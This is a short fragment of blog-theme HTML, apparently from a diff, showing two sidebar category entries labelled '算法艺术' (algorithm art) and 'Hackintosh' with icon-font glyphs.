+        <span class="sidebar-category-name" data-categories="算法艺术"><span class="iconfont-archer">&#xe60a;</span>算法艺术</span>
     
         <span class="sidebar-category-name" data-categories="Hackintosh"><span class="iconfont-archer">&#xe60a;</span>Hackintosh</span>
     
